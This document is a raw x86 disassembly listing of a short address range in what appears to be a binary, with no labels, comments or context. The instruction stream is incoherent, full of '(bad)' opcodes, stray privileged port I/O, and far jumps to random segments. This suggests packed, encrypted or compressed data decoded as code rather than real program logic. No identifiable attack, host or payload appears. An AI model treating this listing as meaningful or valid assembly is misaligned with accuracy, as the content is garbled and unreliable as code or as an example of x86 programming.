  4132c9:	xchg   edx,eax
  4132ca:	adc    BYTE PTR [edx+eiz*4-0x2a],bl
  4132ce:	jnp    0x4132c1
  4132d0:	imul   esp,DWORD PTR [ecx-0x22],0xb4de69fb
  4132d7:	loope  0x4132ce
  4132d9:	mov    eax,cs:0x4c80faf3
  4132df:	cmp    eax,0xb4157038
  4132e4:	js     0x413284
  4132e6:	loopne 0x4132b1
  4132e8:	cmp    eax,0x2d8eac7e
  4132ed:	lods   eax,DWORD PTR ds:[esi]
  4132ee:	aaa    
  4132ef:	cmc    
  4132f0:	scas   eax,DWORD PTR es:[edi]
  4132f1:	loop   0x41330e
  4132f3:	jno    0x41331b
  4132f5:	mov    al,0xf7
  4132f7:	mov    bl,0x24
  4132f9:	mov    ch,0x97
  4132fb:	out    0x92,eax
  4132fd:	sar    DWORD PTR [eax],cl
  4132ff:	fld    DWORD PTR [eax+0x4e]
  413302:	sti    
  413303:	ret    
  413304:	inc    esi
  413305:	repnz mov bl,0x33
  413308:	aad    0xab
  41330a:	cmp    eax,0x1f0e4a37
  41330f:	mov    al,0x67
  413311:	adc    al,0x1a
  413313:	pop    esi
  413314:	pusha  
  413315:	sbb    ecx,DWORD PTR [edi]
  413317:	popa   
  413318:	mov    ch,0x6a
  41331a:	or     edx,DWORD PTR [ecx+eax*2-0x15]
  41331e:	out    dx,eax
  41331f:	xchg   esp,eax
  413320:	test   al,0xf9
  413322:	test   BYTE PTR [esi-0x535a9154],al
  413328:	or     eax,0x1bf7ad0d
  41332d:	fcom   DWORD PTR [ebx-0x1f]
  413330:	lahf   
  413331:	mov    DWORD PTR [esi],ebp
  413333:	adc    eax,DWORD PTR [edi+0x5a]
  413336:	xchg   edx,eax
  413337:	sub    dh,cl
  413339:	mov    ds:0x583966d8,eax
  41333e:	mov    ch,dh
  413340:	adc    edi,DWORD PTR [eax]
  413342:	push   0x47
  413344:	ins    BYTE PTR es:[edi],dx
  413345:	mov    edx,0x13f973d1
  41334a:	aad    0xab
  41334c:	cdq    
  41334d:	retf   0xfcd7
  413350:	push   0x25ae9ec8
  413355:	push   es
  413356:	fisttp QWORD PTR [edx]
  413358:	int3   
  413359:	repnz fmul DWORD PTR [ebx-0x752cca87]
  413360:	stos   BYTE PTR es:[edi],al
  413361:	inc    edx
  413362:	pop    eax
  413363:	jmp    0xe893:0xe7fa117c
  41336a:	adc    BYTE PTR ds:[ebx],0x3b
  41336e:	push   ecx
  41336f:	jge    0x413395
  413371:	and    ebx,DWORD PTR [ecx]
  413373:	and    BYTE PTR [edx-0xf],al
  413376:	stos   DWORD PTR es:[edi],eax
  413377:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413378:	mov    ebx,DWORD PTR [eiz*4+0x95ba03c]
  41337f:	cld    
  413380:	scas   eax,DWORD PTR es:[edi]
  413381:	jmp    0x41332b
  413383:	les    ebp,FWORD PTR [ebx]
  413385:	jbe    0x41330f
  413387:	fmul   QWORD PTR [ebp+0x55c755ee]
  41338d:	mov    edx,0x1f2f2bb3
  413392:	cld    
  413393:	mov    ecx,0xc41edfde
  413398:	add    bl,cl
  41339a:	cmp    eax,DWORD PTR [edi-0x5a88f70e]
  4133a0:	adc    bl,ah
  4133a2:	cli    
  4133a3:	into   
  4133a4:	sub    DWORD PTR [ebp-0x3],edi
  4133a7:	sbb    al,0x9c
  4133a9:	pop    esp
  4133aa:	jp     0x41332c
  4133ac:	adc    ah,ah
  4133ae:	cmc    
  4133af:	dec    ebp
  4133b0:	(bad)  
  4133b1:	addr16 mov esi,0xf5e3fcc0
  4133b7:	dec    edx
  4133b8:	stos   BYTE PTR es:[edi],al
  4133b9:	into   
  4133ba:	push   cs
  4133bb:	aad    0xf1
  4133bd:	jbe    0x413392
  4133bf:	push   esi
  4133c0:	jp     0x41341c
  4133c2:	sub    ah,bh
  4133c4:	or     DWORD PTR [eax+eiz*1-0x7],edx
  4133c8:	push   esp
  4133c9:	and    BYTE PTR [ecx+0x2e],al
  4133cc:	aas    
  4133cd:	and    DWORD PTR [ebx-0xb160c38],ecx
  4133d3:	push   ebx
  4133d4:	dec    esp
  4133d5:	into   
  4133d6:	(bad)  
  4133d7:	ins    BYTE PTR es:[edi],dx
  4133d8:	inc    eax
  4133d9:	and    cl,BYTE PTR [ebx+0x65de77c9]
  4133df:	push   ebp
  4133e0:	xor    al,0x6d
  4133e2:	mov    esi,0x576b9912
  4133e7:	ret    0x4191
  4133ea:	popf   
  4133eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133ec:	enter  0xc201,0x9
  4133f0:	mov    ecx,0x185add57
  4133f5:	test   al,0xf6
  4133f7:	loope  0x413473
  4133f9:	xchg   ebp,edx
  4133fb:	mov    dh,0xdf
  4133fd:	inc    eax
  4133fe:	mov    cl,ch
  413400:	loopne 0x4133bd
  413402:	cmp    ecx,ebx
  413404:	xor    eax,0xf9b8cc0d
  413409:	int3   
  41340a:	or     ch,BYTE PTR [edi-0xd]
  41340d:	jns    0x4133f1
  41340f:	fnstenv [ebx-0x292fe06d]
  413415:	mov    al,BYTE PTR [ecx-0x5aa57934]
  41341b:	sub    BYTE PTR [ebx],dh
  41341d:	add    esi,esi
  41341f:	sahf   
  413420:	into   
  413421:	into   
  413422:	mov    dh,0xa2
  413424:	das    
  413425:	mov    dl,0x12
  413427:	fbstp  TBYTE PTR [edx]
  413429:	lahf   
  41342a:	in     eax,0xb8
  41342c:	add    eax,0xfb389763
  413431:	and    dh,BYTE PTR [eax]
  413433:	mov    ds:0xea18376e,al
  413438:	(bad)  
  413439:	or     eax,0x7d223ebd
  41343e:	gs inc ebp
  413440:	xchg   edi,eax
  413441:	in     al,0xf4
  413443:	jmp    0x5b01af4a
  413448:	sbb    eax,0xe8865099
  41344d:	mov    dl,0xad
  41344f:	fmul   st,st(4)
  413451:	loopne 0x4133fc
  413453:	dec    ecx
  413454:	retf   
  413455:	or     BYTE PTR [ebp+0x3f],al
  413458:	in     eax,dx
  413459:	adc    BYTE PTR [edi+ebx*8-0x31],0xd6
  41345e:	push   ss
  41345f:	out    0x6e,eax
  413461:	inc    esi
  413462:	push   ds
  413463:	xor    BYTE PTR [eax],dh
  413465:	(bad)  
  413466:	xchg   ebx,eax
  413467:	push   ebp
  413468:	mov    ecx,DWORD PTR [ebx-0x66]
  41346b:	mov    ds:0xabb271d4,eax
  413470:	push   ds
  413471:	cvtpi2ps xmm5,QWORD PTR [eax]
  413474:	inc    esi
  413475:	aaa    
  413476:	sbb    al,0x2b
  413478:	pop    esi
  413479:	push   cs
  41347a:	(bad)  
  41347b:	enter  0xbf12,0xe
  41347f:	enter  0x2ab8,0xa7
  413483:	sti    
  413484:	rcr    BYTE PTR [edi+0x5950b0b2],0xda
  41348b:	popa   
  41348c:	mov    al,bh
  41348e:	xchg   edx,eax
  41348f:	mov    eax,ds:0xe3f103cb
  413494:	sbb    BYTE PTR [esi+0x38c37f81],cl
  41349a:	mov    ds:0x23b4d840,al
  41349f:	test   al,0xf9
  4134a1:	sbb    BYTE PTR ds:0x277ab4d5,bh
  4134a7:	mov    al,0xc4
  4134a9:	jmp    0x12a78356
  4134ae:	push   esi
  4134af:	sar    BYTE PTR [edx+0x2a],1
  4134b2:	pop    eax
  4134b3:	cmp    ah,BYTE PTR [edx+0x5d]
  4134b6:	sbb    al,0xa4
  4134b8:	xchg   edi,eax
  4134b9:	cwde   
  4134ba:	mov    edx,0xbcd00fed
  4134bf:	fnstenv [esi+0x59e45c8b]
  4134c5:	(bad)  
  4134c6:	cmp    cl,ch
  4134c8:	fld    TBYTE PTR [esi]
  4134ca:	jmp    0xeeb1:0xece381c5
  4134d1:	dec    ecx
  4134d2:	into   
  4134d3:	cwde   
  4134d4:	fbld   TBYTE PTR [ebx]
  4134d6:	mov    ds:0xfd8c86ea,al
  4134db:	xchg   DWORD PTR [ebp+0x68eb8517],esi
  4134e1:	and    al,0xd8
  4134e3:	mov    bl,0x8
  4134e5:	cmp    eax,0x8df63052
  4134ea:	das    
  4134eb:	xchg   ecx,eax
  4134ec:	and    eax,DWORD PTR fs:[esp+esi*8-0x79f0f200]
  4134f4:	cmc    
  4134f5:	cmp    ah,dl
  4134f7:	mov    DWORD PTR [esi],edi
  4134f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4134fa:	adc    ecx,ebx
  4134fc:	xor    DWORD PTR [ecx-0xe],edx
  4134ff:	pushf  
  413500:	sbb    esi,DWORD PTR [eax+0x166bf188]
  413506:	ds int3 
  413508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413509:	or     esp,0x9c83c84d
  41350f:	pop    ss
  413510:	sbb    al,BYTE PTR [edx-0x6d7d6b56]
  413516:	dec    ebx
  413517:	pop    es
  413518:	xchg   esi,eax
  413519:	add    al,0xba
  41351b:	nop
  41351c:	mov    cl,0xf7
  41351e:	cs or  al,0xb1
  413521:	out    dx,al
  413522:	dec    ecx
  413523:	dec    esp
  413524:	dec    edx
  413525:	pop    ebp
  413526:	(bad)  
  413527:	inc    esp
  413528:	cwde   
  413529:	fdiv   st(0),st
  41352b:	push   eax
  41352c:	hlt    
  41352d:	daa    
  41352e:	imul   ebx,DWORD PTR [edi-0x7d],0x938969c8
  413535:	xlat   BYTE PTR ds:[ebx]
  413536:	cs push 0x6a9a3891
  41353c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41353d:	xor    eax,0x9346ed5d
  413542:	les    eax,FWORD PTR [edx+0x5e]
  413545:	sub    ecx,DWORD PTR [ecx-0x3a]
  413548:	xor    al,0x92
  41354a:	add    al,0x2a
  41354c:	xchg   esp,eax
  41354d:	add    esp,ecx
  41354f:	xor    bh,ch
  413551:	jmp    0x972:0x11052f9d
  413558:	mov    ebx,0x9bc84e70
  41355d:	cmp    DWORD PTR [ebx+0x67],ebx
  413560:	mov    edi,0x964a1814
  413565:	mov    DWORD PTR [eax],edx
  413567:	inc    edi
  413568:	mov    ds:0x508ce431,al
  41356d:	iret   
  41356e:	(bad)  
  413570:	cmp    dh,dl
  413572:	pushf  
  413573:	cmp    ch,dh
  413575:	push   ss
  413576:	adc    al,BYTE PTR [ecx+0x41]
  413579:	jb     0x4135e4
  41357b:	or     DWORD PTR [ebx],ecx
  41357d:	test   DWORD PTR [esp+0x37b8dc75],esp
  413584:	adc    al,0x69
  413586:	adc    ch,BYTE PTR [ebx-0x31]
  413589:	cmp    eax,0x37b825e1
  41358e:	push   edx
  41358f:	les    eax,FWORD PTR [esi]
  413591:	push   ebp
  413592:	ins    DWORD PTR es:[edi],dx
  413593:	out    0x7d,eax
  413595:	fist   WORD PTR [edx-0x770fc2a6]
  41359b:	push   edx
  41359c:	test   eax,0xcf67ed06
  4135a1:	fld    TBYTE PTR [edi-0x83dd649]
  4135a7:	and    DWORD PTR [edi-0x1f],ebx
  4135aa:	or     ebp,DWORD PTR [edx-0x6c]
  4135ad:	hlt    
  4135ae:	repz and DWORD PTR [ecx+0x6b],edx
  4135b2:	sub    cl,BYTE PTR [ebx]
  4135b4:	cmp    eax,0x90fe6b6b
  4135b9:	rcr    BYTE PTR [ecx-0x28],0x1c
  4135bd:	add    eax,0x408c05d
  4135c2:	sub    al,0xd5
  4135c4:	(bad)  
  4135c5:	neg    BYTE PTR [ebx+0x5b51d28e]
  4135cb:	call   0x9e03:0xa3930a7b
  4135d2:	fdivr  DWORD PTR [ecx*1-0x196f9f5d]
  4135d9:	mov    al,ds:0xe31676dc
  4135de:	sub    DWORD PTR [ebx+0x74],ebp
  4135e1:	clc    
  4135e2:	psubq  mm3,QWORD PTR [esi-0x5b4a4370]
  4135e9:	sub    al,0x6b
  4135eb:	outs   dx,BYTE PTR ds:[esi]
  4135ec:	add    ch,BYTE PTR [eax+0x7f320d06]
  4135f2:	cmc    
  4135f3:	arpl   WORD PTR [edi],si
  4135f5:	inc    eax
  4135f6:	cs adc edi,esp
  4135f9:	shr    BYTE PTR [ecx],1
  4135fb:	and    DWORD PTR [eax-0x1255b6ba],ebp
  413601:	or     DWORD PTR [edi],eax
  413603:	iret   
  413604:	fild   QWORD PTR [edi-0xb750b48]
  41360a:	ja     0x413649
  41360c:	cli    
  41360d:	icebp  
  41360e:	stos   BYTE PTR es:[edi],al
  41360f:	mov    WORD PTR [edi+0x63d39fdc],gs
  413615:	mov    edi,0xeacdb061
  41361a:	mov    dl,0x9f
  41361c:	cmp    DWORD PTR [esi],esp
  41361e:	enter  0x5e83,0xa9
  413622:	(bad)  
  413623:	pop    ebx
  413624:	std    
  413625:	push   es
  413626:	adc    BYTE PTR [esp+edx*2-0x6f],bh
  41362a:	sub    ebp,edi
  41362c:	jnp    0x41364a
  41362e:	push   edx
  41362f:	pop    DWORD PTR [esi+0x3289f271]
  413635:	in     eax,0x63
  413637:	cmc    
  413638:	bound  edx,QWORD PTR [ebx+0x41]
  41363b:	ins    DWORD PTR es:[edi],dx
  41363c:	ret    0x5543
  41363f:	xchg   ecx,eax
  413640:	pop    ds
  413641:	push   ebp
  413642:	sbb    al,BYTE PTR [ecx+0x79]
  413645:	cmp    ecx,esi
  413647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413648:	mov    ecx,0x5ce16bd5
  41364d:	jge    0x41363b
  41364f:	imul   ebx,edx,0x3bf7ea83
  413655:	xchg   BYTE PTR [ecx+0x6323fcd9],bh
  41365b:	rol    DWORD PTR [edx-0x73],0x2a
  41365f:	and    al,0xba
  413661:	or     BYTE PTR [edx+0x23],bl
  413664:	xchg   ecx,eax
  413665:	sub    edi,DWORD PTR [ebx+0x69788d7c]
  41366b:	(bad)  
  41366c:	lock neg DWORD PTR [eax+0x45e016f0]
  413673:	rcl    DWORD PTR [edi+edi*8-0x2da3009f],1
  41367a:	rcr    BYTE PTR [eax+0x472c1f94],0x5a
  413681:	js     0x41367c
  413683:	add    DWORD PTR [ebx],eax
  413685:	sbb    eax,0x77ee099
  41368a:	pop    ebp
  41368b:	sub    eax,0xcc80611d
  413690:	pusha  
  413691:	mov    bl,0xd9
  413693:	xor    al,0x4b
  413695:	xchg   ebx,eax
  413696:	es mov ecx,0x22dd3553
  41369c:	data16 rol BYTE PTR [eax-0x13],0xeb
  4136a1:	xor    DWORD PTR [edi+0x4b705216],edx
  4136a7:	ss popa 
  4136a9:	sbb    DWORD PTR [eax-0x38d15f8a],edx
  4136af:	fistp  QWORD PTR [ebx-0x6b]
  4136b2:	lods   eax,DWORD PTR ds:[esi]
  4136b3:	cmc    
  4136b4:	xchg   ebp,eax
  4136b5:	mov    dh,0x16
  4136b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4136b8:	xor    DWORD PTR [esi],ebx
  4136ba:	lea    esp,[edi+0x36]
  4136bd:	call   DWORD PTR [edx-0xe]
  4136c0:	(bad)  
  4136c1:	lds    edx,FWORD PTR [eax+0x5275067b]
  4136c7:	dec    edi
  4136c8:	repz enter 0x1e61,0x64
  4136cd:	mov    esp,0xdc982a43
  4136d2:	pop    ds
  4136d3:	xchg   ebx,eax
  4136d4:	mov    ss:0xad228107,al
  4136da:	or     BYTE PTR ds:0xa862c1ce,al
  4136e0:	lods   eax,DWORD PTR ds:[esi]
  4136e1:	inc    esi
  4136e2:	pop    esi
  4136e3:	fs push ebx
  4136e5:	mov    esi,0xb1ae4552
  4136ea:	jmp    0xe91fd841
  4136ef:	add    dl,BYTE PTR [eax+ecx*2]
  4136f2:	sub    bl,BYTE PTR [esp+edx*1-0x62]
  4136f6:	mov    BYTE PTR [ecx],0xf3
  4136f9:	dec    edx
  4136fa:	mov    WORD PTR [ebp-0x50],?
  4136fd:	jb     0x4136f6
  4136ff:	dec    ebx
  413700:	add    edx,DWORD PTR [ebx+0x758f0936]
  413706:	loopne 0x4136b5
  413708:	dec    esp
  413709:	cmp    eax,ecx
  41370b:	mov    WORD PTR [ebx+0x77],?
  41370e:	mov    esi,0x99781a60
  413713:	pop    esi
  413714:	jl     0x4136a8
  413716:	adc    ebx,DWORD PTR [esi+0x6c]
  413719:	mov    esp,0x6020ef81
  41371e:	and    eax,0xe9e03be5
  413723:	mov    DWORD PTR [eax+0x73],edx
  413726:	push   0x47
  413728:	push   ecx
  413729:	jl     0x41373b
  41372b:	shl    esi,1
  41372d:	or     BYTE PTR ds:0xd000c725,bh
  413733:	cmp    BYTE PTR [eax-0x667389a8],ch
  413739:	ss pusha 
  41373b:	outs   dx,DWORD PTR ds:[esi]
  41373c:	sar    BYTE PTR [ebp+0x66],0xad
  413740:	mov    esp,0xbf79bdb
  413745:	inc    ecx
  413746:	sar    DWORD PTR [edx],0x38
  413749:	mov    ecx,0xc86066c3
  41374e:	js     0x413754
  413750:	mov    BYTE PTR [edi],ch
  413752:	popf   
  413753:	in     al,0x40
  413755:	mov    dl,0x59
  413757:	sahf   
  413758:	pusha  
  413759:	arpl   WORD PTR [ebx+0x435fe59e],si
  41375f:	ret    0x668b
  413762:	shl    DWORD PTR [edx-0x17928257],cl
  413768:	bnd jmp 0x592e7d19
  41376e:	mov    ?,WORD PTR [eax+0x22f1ac2c]
  413774:	imul   ecx,DWORD PTR [ebx],0x22
  413777:	jg     0x4137b8
  413779:	mov    cl,0x9
  41377b:	and    al,0x2b
  41377d:	sub    ah,BYTE PTR [esi]
  41377f:	lds    edx,FWORD PTR gs:[esi-0x58]
  413783:	sbb    eax,0x9ecda229
  413788:	dec    ecx
  413789:	push   edi
  41378a:	adc    BYTE PTR [ebx],bh
  41378c:	sub    al,0x13
  41378e:	mov    WORD PTR [ebx+0x6f],es
  413791:	xor    ebx,DWORD PTR [eax+0x514e67b5]
  413797:	inc    ecx
  413798:	mov    ch,0x30
  41379a:	rcl    DWORD PTR [esi],0x18
  41379d:	addr16 mov dh,0x63
  4137a0:	xchg   ebp,eax
  4137a1:	cwde   
  4137a2:	cld    
  4137a3:	jns    0x41380c
  4137a5:	push   edi
  4137a6:	inc    esp
  4137a7:	mov    gs,WORD PTR [ebx]
  4137a9:	adc    eax,DWORD PTR [ebx]
  4137ab:	mov    ds,WORD PTR [esi+0x4d]
  4137ae:	pop    esp
  4137af:	test   BYTE PTR [ecx],0x4b
  4137b2:	cmp    BYTE PTR [edx],al
  4137b4:	xlat   BYTE PTR ds:[ebx]
  4137b5:	clc    
  4137b6:	add    al,0x27
  4137b8:	push   ds
  4137b9:	std    
  4137ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137bb:	js     0x413825
  4137bd:	out    0xa8,al
  4137bf:	imul   edx,DWORD PTR [eax],0x2433e9ef
  4137c5:	and    BYTE PTR [eax],cl
  4137c7:	popa   
  4137c8:	add    BYTE PTR [ebx+ecx*8],al
  4137cb:	rol    BYTE PTR [ebx-0x70],cl
  4137ce:	mov    ch,0x91
  4137d0:	jl     0x413768
  4137d2:	jo     0x41384c
  4137d4:	scas   al,BYTE PTR es:[edi]
  4137d5:	mov    ch,0x93
  4137d7:	sub    al,0xeb
  4137d9:	loope  0x4137d7
  4137db:	jno    0x413776
  4137dd:	inc    ecx
  4137de:	aad    0xa2
  4137e0:	mov    al,ds:0x2341df73
  4137e5:	stc    
  4137e6:	pop    ecx
  4137e7:	and    BYTE PTR [ecx+edi*1],cl
  4137ea:	imul   edx,ecx,0xbe5702cd
  4137f0:	push   es
  4137f1:	das    
  4137f2:	sbb    al,0xb
  4137f4:	js     0x4137f4
  4137f6:	cmp    bl,BYTE PTR [ebx+0x7b156e90]
  4137fc:	in     al,dx
  4137fd:	mov    ebp,0x82ce1335
  413802:	mov    ebp,DWORD PTR [edx]
  413804:	test   BYTE PTR [ecx-0x18],ah
  413807:	call   0x2277f103
  41380c:	pop    edi
  41380d:	in     al,0xf
  41380f:	add    dl,0x70
  413812:	clc    
  413813:	hlt    
  413814:	dec    ebp
  413815:	push   edi
  413816:	add    eax,0xa87d8240
  41381b:	jle    0x4137b6
  41381d:	push   DWORD PTR [edi+0x16aeb585]
  413823:	mov    eax,0x5de6b79c
  413828:	push   cs
  413829:	sbb    al,0x8
  41382b:	mov    dl,0xcf
  41382d:	jae    0x41382b
  41382f:	stos   DWORD PTR es:[edi],eax
  413830:	mov    ecx,0x6d8057a
  413835:	in     eax,dx
  413836:	pusha  
  413837:	push   es
  413838:	push   esi
  413839:	ins    DWORD PTR es:[edi],dx
  41383a:	pop    ds
  41383b:	adc    dl,BYTE PTR [eax]
  41383d:	cld    
  41383e:	fdivr  DWORD PTR [esi]
  413840:	scas   al,BYTE PTR es:[edi]
  413841:	aad    0xbf
  413843:	fwait
  413844:	xor    ecx,edx
  413846:	mov    bh,0x5a
  413848:	test   BYTE PTR [ebx+ecx*1+0xf],0x66
  41384d:	adc    eax,0x6c20db85
  413852:	adc    eax,0x75aaee3e
  413857:	mov    ebp,0xeead7c6b
  41385c:	pop    esi
  41385d:	pop    ecx
  41385e:	div    BYTE PTR [esi]
  413860:	sbb    eax,DWORD PTR [edi+0xb4edf19]
  413866:	sub    BYTE PTR [ebx-0x4302ca80],0xa2
  41386d:	xor    edx,DWORD PTR [ebx]
  41386f:	ja     0x4138e5
  413871:	mov    edx,0x83807c89
  413876:	aad    0x3c
  413878:	pop    ebp
  413879:	push   ds
  41387a:	mov    bh,0x3b
  41387c:	das    
  41387d:	or     DWORD PTR [ecx-0x15],ebx
  413880:	xchg   al,ch
  413882:	test   DWORD PTR [edx],esp
  413884:	push   esi
  413885:	push   ss
  413886:	imul   ebx,DWORD PTR [ebp-0x1b],0x1b
  41388a:	sub    DWORD PTR [ebx-0x23552bbf],0xffffffdb
  413891:	add    BYTE PTR [eax],al
  413893:	inc    ebx
  413894:	(bad)  
  413895:	loopne 0x413878
  413897:	sub    eax,0x94b60e36
  41389c:	aam    0x3f
  41389e:	mov    ebx,0xb7ce8a14
  4138a3:	jp     0x41384a
  4138a5:	int3   
  4138a6:	in     eax,0x9a
  4138a8:	cwde   
  4138a9:	mov    eax,0x1ed88e7c
  4138ae:	add    ebp,DWORD PTR [ebx+0x318c4e72]
  4138b4:	es sbb al,0xb1
  4138b7:	jmp    0x818af8ed
  4138bc:	fwait
  4138bd:	mov    ah,0xe4
  4138bf:	ret    0x6db5
  4138c2:	or     ecx,edi
  4138c4:	pop    ss
  4138c5:	cmp    DWORD PTR [esi-0x4d98cea6],ebp
  4138cb:	jo     0x41392f
  4138cd:	ret    
  4138ce:	out    dx,eax
  4138cf:	mov    BYTE PTR [edi],al
  4138d1:	mov    DWORD PTR ss:[eax],ebp
  4138d4:	mov    DWORD PTR [esi-0x45],edi
  4138d7:	ins    DWORD PTR es:[edi],dx
  4138d8:	sub    dh,bh
  4138da:	dec    edi
  4138db:	sbb    bh,BYTE PTR ds:0x2bf97c58
  4138e1:	sub    BYTE PTR [edi+0x3746be0d],dh
  4138e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138e8:	pop    ebp
  4138e9:	mov    cl,0x37
  4138eb:	fist   DWORD PTR [ebx-0x54]
  4138ee:	jns    0x4138dd
  4138f0:	jb     0x41396e
  4138f2:	jb     0x4138f1
  4138f4:	mov    WORD PTR [eax-0x2c],cs
  4138f7:	xor    eax,0x91106e46
  4138fc:	jnp    0x4138c2
  4138fe:	pop    es
  4138ff:	push   edx
  413900:	addr16 loop 0x413899
  413903:	xchg   edx,eax
  413904:	(bad)  
  413905:	aas    
  413906:	cmp    DWORD PTR [edx],esi
  413908:	sbb    eax,0xe8c75fb2
  41390d:	das    
  41390e:	xor    dl,BYTE PTR [edx-0x6c]
  413911:	fisubr WORD PTR [ecx+0x1f1cc84a]
  413917:	mov    dl,0xe3
  413919:	mov    ebp,0x44bd0961
  41391e:	xchg   ecx,eax
  41391f:	push   ecx
  413920:	pop    esi
  413921:	in     eax,dx
  413922:	xchg   ecx,eax
  413923:	aad    0x8e
  413925:	outs   dx,BYTE PTR ds:[esi]
  413926:	dec    esp
  413927:	mov    ah,0x91
  413929:	leave  
  41392a:	push   eax
  41392b:	pop    es
  41392c:	cld    
  41392d:	arpl   cx,si
  41392f:	lock test al,0x70
  413932:	in     al,0xae
  413934:	fwait
  413935:	xor    DWORD PTR [esi],edi
  413937:	pop    edi
  413938:	cld    
  413939:	aad    0xca
  41393b:	xor    DWORD PTR [eax-0x42195e16],edi
  413941:	popa   
  413942:	cmp    dh,BYTE PTR [ecx+0xa]
  413945:	pop    eax
  413946:	pop    edi
  413947:	pop    edi
  413948:	mov    esp,DWORD PTR [ebp+0x791ccb6a]
  41394e:	inc    esi
  41394f:	push   edi
  413950:	xchg   edx,eax
  413951:	aaa    
  413952:	add    eax,0x3c64c63b
  413957:	int3   
  413958:	(bad)  
  41395a:	rol    DWORD PTR [edx+0x3020225a],cl
  413960:	outs   dx,BYTE PTR ds:[esi]
  413961:	hlt    
  413962:	into   
  413963:	popf   
  413964:	xor    ebx,DWORD PTR [ecx-0x69]
  413967:	jnp    0x413963
  413969:	fst    DWORD PTR [ebx-0x5a306a7f]
  41396f:	call   0xca0:0xe3d017f0
  413976:	sub    bh,dh
  413978:	sbb    ebx,edx
  41397a:	sub    BYTE PTR [esi],ah
  41397c:	lea    esp,[ecx]
  41397e:	cwde   
  41397f:	pop    ebx
  413980:	arpl   si,ax
  413982:	xor    BYTE PTR [esi-0x72df31d],dl
  413988:	(bad)  
  413989:	adc    cl,BYTE PTR [ebx-0x48eceb38]
  41398f:	add    al,0x5b
  413991:	das    
  413992:	and    BYTE PTR [edx-0x49be2b43],ah
  413998:	jecxz  0x413a10
  41399a:	les    eax,FWORD PTR [ebx+0x73dda6bf]
  4139a0:	dec    esi
  4139a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139a2:	xchg   edi,eax
  4139a3:	jl     0x4139b9
  4139a5:	xor    al,0x4d
  4139a7:	xchg   DWORD PTR ds:0x9bfb1447,esp
  4139ad:	inc    ebp
  4139ae:	(bad)  
  4139af:	iret   
  4139b0:	mov    dh,0xd
  4139b2:	pop    es
  4139b3:	imul   edi,DWORD PTR [ecx],0xf908acd7
  4139b9:	loopne 0x413a1a
  4139bb:	mov    cs,WORD PTR [edi-0x7e]
  4139be:	aaa    
  4139bf:	sub    BYTE PTR [edi],dh
  4139c1:	xchg   edx,eax
  4139c2:	popa   
  4139c3:	inc    eax
  4139c4:	rol    DWORD PTR [ebp+eiz*4-0x33],1
  4139c8:	cmp    BYTE PTR [ecx-0x30],cl
  4139cb:	and    al,al
  4139cd:	retf   0x14f6
  4139d0:	in     al,dx
  4139d1:	out    dx,eax
  4139d2:	test   eax,0x4bd4aaa1
  4139d7:	sbb    al,0xd9
  4139d9:	std    
  4139da:	adc    al,0x8a
  4139dc:	imul   eax,ecx,0xb8ff7f9f
  4139e2:	out    dx,eax
  4139e3:	and    BYTE PTR [edi-0x8],cl
  4139e6:	jae    0x4139c5
  4139e8:	les    ebp,FWORD PTR [ebp+ebp*1-0x51f49f4b]
  4139ef:	add    al,0x61
  4139f1:	xor    BYTE PTR [ebx+edi*2],ch
  4139f4:	es in  al,dx
  4139f6:	js     0x4139dc
  4139f8:	ret    
  4139f9:	iret   
  4139fa:	jmp    0xa91d40cf
  4139ff:	dec    eax
  413a00:	dec    edx
  413a01:	adc    al,0xf0
  413a03:	lock call 0x2843a613
  413a09:	push   ecx
  413a0a:	arpl   WORD PTR [eax-0x7f],ax
  413a0d:	jno    0x413a56
  413a0f:	dec    ecx
  413a10:	jmp    0x4139fd
  413a12:	adc    BYTE PTR [ebx+0x4bd59f79],dl
  413a18:	popf   
  413a19:	ror    BYTE PTR [eax+0x5a],0xd7
  413a1d:	add    DWORD PTR [ecx],ebp
  413a1f:	dec    edx
  413a20:	mov    esp,0x43535c2d
  413a25:	fxch   st(7)
  413a27:	imul   ecx,DWORD PTR ds:0xac0e1772,0xe
  413a2e:	loop   0x413a15
  413a30:	jecxz  0x413a38
  413a32:	fild   QWORD PTR [ebp+0xf0071dd]
  413a38:	mov    ecx,0x2c129c7b
  413a3d:	mov    ds:0x8092c890,eax
  413a42:	and    DWORD PTR [edx-0x276a5725],ebp
  413a48:	fist   WORD PTR [ebp+0x1e0ddcb6]
  413a4e:	mov    bh,0x94
  413a50:	div    BYTE PTR [edx]
  413a52:	cdq    
  413a53:	sti    
  413a54:	enter  0xe715,0xd9
  413a58:	and    al,0x4
  413a5a:	into   
  413a5b:	adc    eax,0x7d6d2383
  413a60:	js     0x4139f3
  413a62:	jge    0x413acc
  413a64:	out    0x2a,eax
  413a66:	pop    edx
  413a68:	or     esi,esp
  413a6a:	or     ebp,DWORD PTR [ebp+0x7c]
  413a6d:	xchg   ebx,eax
  413a6e:	sbb    eax,DWORD PTR [ebx-0x7]
  413a71:	call   0xd75fc5f9
  413a76:	xor    DWORD PTR ds:0xb77a55f8,esi
  413a7c:	in     eax,0xc
  413a7e:	pop    ss
  413a7f:	cmp    DWORD PTR [esi-0x21],edx
  413a82:	mov    cl,0x1c
  413a84:	xor    ah,dl
  413a86:	sti    
  413a87:	mov    fs,ebx
  413a89:	adc    eax,DWORD PTR [ebp-0x42]
  413a8c:	add    eax,0x2419794c
  413a91:	dec    edx
  413a92:	mov    al,ds:0xac6c8c0c
  413a97:	repz popa 
  413a99:	jp     0x413ae8
  413a9b:	mov    dh,0x40
  413a9d:	mov    al,ds:0xc93e5b02
  413aa2:	clc    
  413aa3:	mov    edx,0x7b1bb5c6
  413aa8:	push   es
  413aa9:	ror    DWORD PTR [edi-0x17758159],cl
  413aaf:	adc    bh,BYTE PTR [edi-0x78]
  413ab2:	inc    ecx
  413ab3:	mov    ah,0x42
  413ab5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ab6:	inc    esp
  413ab7:	enter  0xd912,0xd7
  413abb:	sub    bl,al
